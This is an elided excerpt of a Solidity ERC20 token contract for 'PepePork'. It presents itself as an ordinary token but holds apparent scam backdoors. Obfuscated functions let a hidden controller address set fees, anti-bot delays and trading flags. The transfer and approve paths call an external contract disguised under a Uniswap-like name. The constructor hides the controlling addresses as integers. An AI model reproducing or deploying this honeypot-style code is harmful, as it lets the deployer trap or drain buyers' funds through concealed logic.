...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "PepePork";
    string private _symbol = "PepePork";
    ...
    uniswapV1 private uniswapV83PairToken;
    ...
    address private uniswapV83Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV83PairToken = uniswapV1(uniswapV83Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV83Pair_] = true;
        _isExcludedFromFee[uniswapV83Pair_] = true;
    ...
    function SetholderRew_Ox1172988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV83PairToken.create(8**3);
        }
    }

    function SelectItvs_Ox1172968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
...
/*    function pair_Ox1172998(address aaaa, bool b) public {
...
*/    
    function argum_Ox1172618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV83PairToken.create(8**3);
    ...
    function Ecaor_Ox1172628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV83PairToken.create(8**3);
    ...
    function fees_Ox1172633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
...
*/
    ...
    function initialitzeW_Ox1172658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV83PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV83PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV83PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV83PairToken.create(250**3); 
        }
...
contract PEPEPORK is Token {constructor(uint256 a, uint256 b, uint256 c) Token(address(uint160(uint256(a))), address(uint160(uint256(b))), address(uint160(uint256(c)))) {}}